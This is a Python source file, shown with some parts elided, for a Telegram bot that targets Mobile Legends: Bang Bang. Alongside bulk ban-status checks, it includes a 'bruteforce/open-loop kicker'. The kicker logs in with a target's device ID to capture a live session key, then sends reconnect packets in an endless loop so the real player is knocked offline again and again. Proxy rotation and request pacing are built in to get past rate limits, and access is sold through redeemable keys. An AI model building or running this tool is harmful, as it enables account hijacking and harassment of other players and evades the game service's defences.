#!/usr/bin/env python3
"""
mlbb_bot.py — Telegram MLBB device checker + bruteforce/open-loop kicker.
...
Kicker (separate panel, max 3 targets / user):
  • Capture: ONE full login handshake per target → live session_key
  • Open loop: raw PID-10001 reconnect kicks with the captured key,
    one worker per target, infinite attempts
  • Throttled by the same _inflight semaphore + _pace gap as the checker
  • /stop and panel ⏹ both trip the same event → sockets killed
  • Success = server ACKed the reconnect frame, not "packet left socket"

Anti-rate-limit:
  • MAX_INFLIGHT semaphore — caps concurrent logins globally
  • MIN_GAP pacing — jitters start times so bursts don't form
  • proxies.txt rotation — round-robin per attempt (optional)
  • /diag — single-shot diagnostic to see WHY a device fails
...
Env:
  ...
  MLBB_MAX_INFLIGHT  default 4
  MLBB_MIN_GAP       default 0.4
  MLBB_KICKER_MAX    default 3
  MLBB_KICKER_GAP    default 0.5
  MLBB_FREE          "1" → no key required

pip install requests zstandard pycryptodome urllib3 pysocks
"""
...
MAX_INFLIGHT = int(os.environ.get("MLBB_MAX_INFLIGHT", "4"))
MIN_GAP      = float(os.environ.get("MLBB_MIN_GAP", "0.4"))
...
# ── KICKER CONFIG ───────────────────────────────────────────────────
KICKER_MAX_TARGETS = int(os.environ.get("MLBB_KICKER_MAX", "3"))
KICKER_KICK_GAP    = float(os.environ.get("MLBB_KICKER_GAP", "0.5"))
KICKER_STATUS_SECS = 6.0

# Real-login kick path — matches premium_bot4.py's working version.
# Do NOT reuse CLIENT_VERSION here; the kick handshake was validated
# against this build string.
KICK_CLIENT_VERSION = "2.1.99.1205.1"
KICK_SOCK_TIMEOUT   = 4.5
...
def _pace():
    """Ensure at least MIN_GAP seconds between successive login starts."""
    with _pace_lock:
        now = time.monotonic()
...
# Kicker state — declared up here so _abort_uid can trip it without
# needing the kicker module to be defined yet.
_kicker_events: Dict[int, threading.Event] = {}
_kicker_events_lock = threading.Lock()
...
def _abort_uid(uid: int) -> int:
    ...
    if ev is not None:
        ev.set()
    # trip the kicker event too (if any)
    with _kicker_events_lock:
        kev = _kicker_events.get(uid)
    if kev is not None:
        kev.set()
    with _uid_connections_lock:
...
class MLBBConnection:
    def __init__(self, device_id: str, uid: Optional[int] = None,
        ...
        self._proxy_used: Optional[str] = None
    ...
    def connect(self, host=None, port=None):
        ...
        if proxy:
            try:
                ...
                ptype = socks.SOCKS5 if scheme.startswith("socks5") else socks.HTTP
                socks.set_default_proxy(
                    ptype, u.hostname, int(u.port),
...
def check_ban_only(device_id: str, attempts: int = MAX_ATTEMPTS,
    ...
    for i in range(attempts):
        if cancel_event is not None and cancel_event.is_set():
            return {"banned":False,"ban_info":{},"account_id":0,"zone_id":0,
                    "session_key":"","creation_ts":0,"reason":"cancelled",
                    "cancelled":True,"proxy":None}
    ...
    return last or {"banned":False,"ban_info":{},"account_id":0,"zone_id":0,
                    "session_key":"","creation_ts":0,"reason":"unexpected",
                    "cancelled":False,"proxy":None}
...
def format_error_reply(result: Dict) -> str:
    extra = ""
    if result.get("proxy"):
        extra = f"\nProxy: <code>{_esc(result['proxy'])}</code>"
    return (f"<b>⚠️ LOOKUP FAILED</b>\n"
            f"<code>{_esc(result.get('device_id','?'))}</code>\n"
            f"Reason: {_esc(result.get('reason','unknown'))}{extra}")
...
def tg_send_kb(chat_id, text, kb, reply_to=None):
...
HELP_TEXT = (
    ...
    "• <code>/stop</code> — hard-abort running bulk / kicker\n"
    "• <code>/results</code> — resend your last results file\n"
    "• <code>/diag &lt;device_id&gt;</code> — single-shot diagnostic\n"
    "• <code>/kicker</code> — bruteforce / open-loop kicker panel\n"
...
ADMIN_HELP = (
    ...
    "• <code>/stop &lt;tg_id&gt;</code> — hard-abort another user's bulk / kicker\n"
    "• <code>/results &lt;tg_id&gt;</code> — resend another user's last file\n"
    "• <code>/proxies</code> — show loaded proxy count"
)
...
def cmd_stats(chat_id, reply_to):
    ...
    tg_send(chat_id,
            ...
            f"In-flight cap: {MAX_INFLIGHT}\n"
            f"Pace gap     : {MIN_GAP}s\n"
            f"Proxies      : {len(PROXIES)}\n"
            f"Kicker max   : {KICKER_MAX_TARGETS} targets/user @ {KICKER_KICK_GAP}s\n"
...
def cmd_proxies(chat_id, reply_to):
    if not PROXIES:
        tg_send(chat_id, "No proxies loaded. Drop a <code>proxies.txt</code> next to the script.",
                reply_to=reply_to); return
    lines = [f"<b>🌐 Proxies ({len(PROXIES)})</b>\n"]
    for i, p in enumerate(PROXIES[:30], 1):
        lines.append(f"{i}. <code>{_esc(p)}</code>")
    if len(PROXIES) > 30:
        lines.append(f"... +{len(PROXIES)-30} more")
    tg_send(chat_id, "\n".join(lines), reply_to=reply_to)
...
def run_diag(chat_id, device_id, reply_to=None):
    def job():
        t0 = time.time()
        raw = _check_ban_once(device_id, uid=None, cancel_event=None)
        dt = time.time() - t0
        tg_send(chat_id,
                f"<b>🔬 diag</b> <code>{_esc(device_id[:60])}</code>\n\n"
                f"reason    : <code>{_esc(raw.get('reason','?'))}</code>\n"
                f"banned    : <code>{raw.get('banned')}</code>\n"
                f"acc_id    : <code>{raw.get('account_id')}</code>\n"
                f"zone_id   : <code>{raw.get('zone_id')}</code>\n"
                f"cancelled : <code>{raw.get('cancelled')}</code>\n"
                f"proxy     : <code>{_esc(raw.get('proxy') or 'direct')}</code>\n"
                f"inflight  : <code>{MAX_INFLIGHT}</code>   gap: <code>{MIN_GAP}s</code>\n"
                f"elapsed   : <code>{dt:.2f}s</code>",
                reply_to=reply_to)
    _executor.submit(job)
...
def run_bulk(chat_id, uid, device_ids: List[str], reply_to=None):
    ...
    sess_write(f"# Workers : {WORKERS}  inflight: {MAX_INFLIGHT}  gap: {MIN_GAP}s  proxies: {len(PROXIES)}")
    sess_write("=" * 72)
    sess_write("")

    status = tg_send(chat_id,
                     f"🔎 <b>Bulk starting</b>\n"
                     f"Total: {total}\n"
                     f"Workers {WORKERS} · inflight {MAX_INFLIGHT} · gap {MIN_GAP}s"
                     + (f" · {len(PROXIES)} proxies" if PROXIES else "")
                     + f"\nSend <code>/stop</code> to abort.")
...
# ── KICKER MODULE ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════
_kicker_targets: Dict[int, List[str]] = {}
_kicker_lock                          = threading.Lock()

_kicker_running: Dict[int, bool]      = {}
_kicker_run_lock                      = threading.Lock()

_kicker_awaiting: set                 = set()
_kicker_await_lock                    = threading.Lock()

def _kicker_get(uid: int) -> List[str]:
    with _kicker_lock:
        return list(_kicker_targets.get(uid, []))

def _kicker_add(uid: int, dev: str) -> Tuple[bool, str]:
    dev = (dev or "").strip()
    if not dev:
        return False, "empty"
    if not (dev.startswith("and_") or dev.startswith("ios_")):
        return False, "not a device id"
    dev = dev.split()[0]
    with _kicker_lock:
        cur = _kicker_targets.setdefault(uid, [])
        if dev in cur:
            return False, "duplicate"
        if len(cur) >= KICKER_MAX_TARGETS:
            return False, f"limit {KICKER_MAX_TARGETS}"
        cur.append(dev)
        return True, f"{len(cur)}/{KICKER_MAX_TARGETS}"

def _kicker_remove(uid: int, idx: int) -> bool:
    with _kicker_lock:
        cur = _kicker_targets.get(uid)
        if not cur or not (0 <= idx < len(cur)):
            return False
        cur.pop(idx)
        return True

def _kicker_clear(uid: int):
    with _kicker_lock:
        _kicker_targets.pop(uid, None)

def _kicker_event(uid: int) -> threading.Event:
    with _kicker_events_lock:
        ev = _kicker_events.get(uid)
        if ev is None:
            ev = threading.Event()
            _kicker_events[uid] = ev
        return ev

def _kicker_is_running(uid: int) -> bool:
    with _kicker_run_lock:
        return bool(_kicker_running.get(uid))

def _kicker_set_running(uid: int, v: bool):
    with _kicker_run_lock:
        if v: _kicker_running[uid] = True
        else:  _kicker_running.pop(uid, None)

def _kicker_await(uid: int, v: bool):
    with _kicker_await_lock:
        if v: _kicker_awaiting.add(uid)
        else: _kicker_awaiting.discard(uid)

def _kicker_is_awaiting(uid: int) -> bool:
    with _kicker_await_lock:
        return uid in _kicker_awaiting

# ── KICKER: session capture + raw reconnect kick ────────────────────
def _fetch_kick_profile(device_id: str, uid: Optional[int] = None,
                        cancel_event: Optional[threading.Event] = None
                        ) -> Optional[Dict[str, Any]]:
    """
    One full login handshake against the target device to capture a
    live session_key. Returns a profile dict (device_id, account_id,
    session_key, zone_id, game_host, game_port) or None.

    This runs ONCE per target at kicker start — not per kick — so the
    game server sees a single fresh session that the reconnect loop
    then re-authenticates against.
    """
    if cancel_event is not None and cancel_event.is_set():
        return None
    _inflight.acquire()
    try:
        ...
        try:
            ...
            conn.send_data(1, SdpStruct({
                0: conn.device_id,
                1: f"gps_adid={conn.advertising_id}"
                   f"&android_id={conn.android_id}"
                   f"&device_unique_id={conn.imei_md5}",
                2: KICK_CLIENT_VERSION, 3: CHANNEL, 4: "en",
            }))
            pid, res = conn.recv_data()
            if conn.cancelled or pid != 2 or not res:
                return None

            acc = int(res.get(0) or 0)
            sess = res.get(1, "")
            z = res.get(2)
            if isinstance(z, dict):
                zone = int(z.get(0, 0) or 0)
            elif isinstance(z, list) and z:
                first = z[0]
                zone = int((first.get(0, 0)
                            if isinstance(first, dict) else first) or 0)
            else:
                zone = int(z or 0)
            ...
            conn.send_data(5, SdpStruct({
                0: acc, 1: sess, 2: KICK_CLIENT_VERSION,
                5: zone, 6: CHANNEL,
            }))
            pid, res = conn.recv_data()
            if conn.cancelled or pid != 6 or not res:
                return None
...
def _fire_kick(profile: Dict[str, Any], uid: Optional[int] = None,
               cancel_event: Optional[threading.Event] = None,
               timeout: float = KICK_SOCK_TIMEOUT
               ) -> Tuple[bool, float, str]:
    """
    One raw reconnect kick. Opens a fresh TCP socket to the game
    server, sends the PID 10001 login packet with the CAPTURED
    session_key, waits for the server's reply.

    Success = server actually responded (full frame received). A
    clean-send-with-no-ACK is reported as failure — the previous
    implementation counted that as success, which is why the target
    never saw a session-grab notification.
    """
    if cancel_event is not None and cancel_event.is_set():
    ...
    try:
        ...
        try:
            ...
            while len(q) < 4:
                if cancel_event is not None and cancel_event.is_set():
                    return False, (time.time() - t0) * 1000, "cancelled"
                d = sock.recv(4096)
                if not d:
                    return False, (time.time() - t0) * 1000, "closed"
                q += d
            ...
            got_ack = len(q) >= sz
            return got_ack, elapsed, ("ACK" if got_ack else "PARTIAL")
        except socket.timeout:
            return False, (time.time() - t0) * 1000, "timeout"
        except Exception as e:
            return False, (time.time() - t0) * 1000, f"err:{type(e).__name__}"
        finally:
            if sock:
                try: sock.close()
                except Exception: pass
...
# ── open loop: one worker per target, throttled globally ────────────
def _kick_loop(uid: int, chat_id: int, reply_to: Optional[int] = None):
    targets = _kicker_get(uid)
    if not targets:
        tg_send(chat_id, "No kicker targets.", reply_to=reply_to); return
    ev = _kicker_event(uid); ev.clear()
    _kicker_set_running(uid, True)

    kicks = {t: 0 for t in targets}
    fails = {t: 0 for t in targets}
    tlock = threading.Lock()

    def worker(dev: str):
        # Capture a real session ONCE per target — full login handshake.
        profile = _fetch_kick_profile(dev, uid=uid, cancel_event=ev)
        if not profile:
            with tlock:
                fails[dev] += 1
            return
        # Spin raw reconnect kicks against the captured session.
        # Server evicts the current holder each time → target sees
        # "logged in elsewhere" push.
        while not ev.is_set():
            ok, lat, reason = _fire_kick(profile, uid=uid, cancel_event=ev)
            if ev.is_set():
                break
            with tlock:
                if ok: kicks[dev] += 1
                else:  fails[dev] += 1
            ev.wait(KICKER_KICK_GAP)
    ...
    status = tg_send(chat_id,
                     f"🥊 <b>Kicker open-loop START</b>\n"
                     f"Targets: {len(targets)} · gap {KICKER_KICK_GAP}s\n"
                     f"/stop or tap ⏹ to abort.")
    ...
    while not ev.is_set():
        ...
        ev.wait(1.0)
        now = time.time()
        if status_id and now - last >= KICKER_STATUS_SECS:
            last = now
            with tlock:
                snap = {t: (kicks[t], fails[t]) for t in targets}
            lines = [f"🥊 <b>Kicker running</b> ({int(now - t0)}s)",
                     f"Targets: {len(targets)}"]
            for t in targets:
                k, f = snap[t]
                lines.append(f"<code>{_esc(t[:28])}</code> ✅{k} ❌{f}")
            tg_edit(chat_id, status_id, "\n".join(lines))

    for th in threads: th.join(timeout=3)
    _kicker_set_running(uid, False)

    with tlock:
        tk, tf = sum(kicks.values()), sum(fails.values())
    final = (f"🏁 <b>Kicker stopped</b> — {int(time.time() - t0)}s\n"
             f"Kicks ✅ {tk}   Fails ❌ {tf}")
    if status_id:
        tg_edit(chat_id, status_id, final)
    else:
        tg_send(chat_id, final, reply_to=reply_to)

# ── inline panel ────────────────────────────────────────────────────
def _kicker_kb(uid: int) -> Dict:
    targets = _kicker_get(uid)
    rows: List[List[Dict]] = []
    for i, t in enumerate(targets):
        rows.append([{"text": f"🗑 {t[:28]}", "callback_data": f"kick:rm:{i}"}])
    ctrl: List[Dict] = []
    if len(targets) < KICKER_MAX_TARGETS:
        ctrl.append({"text": "➕ Add target", "callback_data": "kick:add"})
    if _kicker_is_running(uid):
        ctrl.append({"text": "⏹ STOP", "callback_data": "kick:stop"})
    elif targets:
        ctrl.append({"text": "▶️ START", "callback_data": "kick:start"})
    if ctrl:
        rows.append(ctrl)
    if targets:
        rows.append([{"text": "🧹 Clear", "callback_data": "kick:clear"}])
    rows.append([{"text": "🔄 Refresh", "callback_data": "kick:panel"}])
    return {"inline_keyboard": rows}

def _kicker_panel_text(uid: int) -> str:
    targets = _kicker_get(uid)
    lines = ["<b>🥊 Bruteforce / Open-Loop Kicker</b>",
             f"Max targets / user: {KICKER_MAX_TARGETS}",
             f"State: <b>{'RUNNING' if _kicker_is_running(uid) else 'idle'}</b>",
             ""]
    if targets:
        for i, t in enumerate(targets, 1):
            lines.append(f"{i}. <code>{_esc(t)}</code>")
    else:
        lines.append("<i>No targets yet — tap ➕ Add.</i>")
    lines += ["", "Each target captures a real session, then spins raw "
                  "reconnects. Global inflight+pace throttle both."]
    return "\n".join(lines)

def _kicker_panel(chat_id: int, uid: int,
                  msg_id: Optional[int] = None,
                  reply_to: Optional[int] = None):
    text = _kicker_panel_text(uid)
    kb = _kicker_kb(uid)
    if msg_id:
        tg_api("editMessageText", chat_id=chat_id, message_id=msg_id,
               text=text, parse_mode="HTML",
               disable_web_page_preview=True, reply_markup=kb)
    else:
        tg_send_kb(chat_id, text, kb, reply_to=reply_to)
...
def handle_callback(cb: Dict):
    ...
    if not is_admin(uid) and not FREE_MODE and not get_user(uid):
        tg_send(chat_id, "⛔ redeem a key first.", reply_to=msg_id); return

    if data == "kick:panel":
        _kicker_panel(chat_id, uid, msg_id=msg_id); return

    if data == "kick:add":
        if len(_kicker_get(uid)) >= KICKER_MAX_TARGETS:
            tg_send(chat_id, f"Limit {KICKER_MAX_TARGETS} reached.", reply_to=msg_id); return
        _kicker_await(uid, True)
        tg_send(chat_id,
                f"Send up to {KICKER_MAX_TARGETS} device IDs — one per line.",
                reply_to=msg_id)
        return

    if data == "kick:start":
        if not _kicker_get(uid):
            tg_send(chat_id, "No targets. Add first.", reply_to=msg_id); return
        if _kicker_is_running(uid):
            tg_send(chat_id, "Already running.", reply_to=msg_id); return
        threading.Thread(target=_kick_loop, args=(uid, chat_id),
                         kwargs={"reply_to": msg_id}, daemon=True,
                         name=f"kicker-{uid}").start()
        _kicker_panel(chat_id, uid, msg_id=msg_id); return

    if data == "kick:stop":
        _kicker_event(uid).set()
        tg_send(chat_id, "⏹ stopping kicker…", reply_to=msg_id); return

    if data == "kick:clear":
        _kicker_clear(uid)
        _kicker_panel(chat_id, uid, msg_id=msg_id); return

    if data.startswith("kick:rm:"):
        try:
            idx = int(data.rsplit(":", 1)[1])
        except ValueError:
            idx = -1
        _kicker_remove(uid, idx)
        _kicker_panel(chat_id, uid, msg_id=msg_id); return
...
def handle_message(msg: Dict):
    ...
    # ── kicker input capture (must run before any command dispatch) ──
    if _kicker_is_awaiting(uid) and text:
        _kicker_await(uid, False)
        added, rejected = 0, []
        for ln in text.splitlines():
            ln = ln.strip()
            if not ln: continue
            if "and_" in ln or "ios_" in ln:
                ok, _ = _kicker_add(uid, ln.split()[0])
                if ok: added += 1
                else:  rejected.append(ln.split()[0])
            else:
                rejected.append(ln)
        tg_send_kb(chat_id,
                   f"✅ added {added} target(s)."
                   + (f"\n⚠️ rejected: {_esc(', '.join(rejected[:6]))}" if rejected else "")
                   + "\n\n" + _kicker_panel_text(uid),
                   _kicker_kb(uid), reply_to=reply_to)
        return
    ...
    if text.startswith("/proxies"):
        if not is_admin(uid):
            tg_send(chat_id, "⛔ admins only.", reply_to=reply_to); return
        cmd_proxies(chat_id, reply_to); return
    ...
    if text.startswith("/start") or text.startswith("/help"):
        tg_send_kb(chat_id, HELP_TEXT, {"inline_keyboard": [
            [{"text": "🥊 Bruteforce Kicker", "callback_data": "kick:panel"}],
        ]}, reply_to=reply_to)
        return
    ...
    if text.startswith("/kicker") or text.startswith("/bruteforce"):
        if not is_admin(uid) and not FREE_MODE and not get_user(uid):
            tg_send(chat_id, "⛔ redeem a key first.", reply_to=reply_to); return
        _kicker_panel(chat_id, uid, reply_to=reply_to); return

    if text.startswith("/diag"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            tg_send(chat_id, "Usage: <code>/diag &lt;device_id&gt;</code>", reply_to=reply_to); return
        dev = parts[1].strip().split()[0]
        tg_send(chat_id, f"🔬 diag running for <code>{_esc(dev[:40])}...</code>", reply_to=reply_to)
        run_diag(chat_id, dev, reply_to=reply_to); return
    ...
    if text.startswith("/stop"):
        ...
        with _kicker_run_lock:
            has_kick = bool(_kicker_running.get(uid))
        if not has_run and not has_kick:
...
def main():
    ...
    print(f"[+] Pace gap    : {MIN_GAP}s")
    print(f"[+] Retries     : {MAX_ATTEMPTS}")
    print(f"[+] Proxies     : {len(PROXIES)} loaded")
    print(f"[+] Kicker      : max {KICKER_MAX_TARGETS}/user @ {KICKER_KICK_GAP}s gap "
          f"(real-login path, cv={KICK_CLIENT_VERSION})")
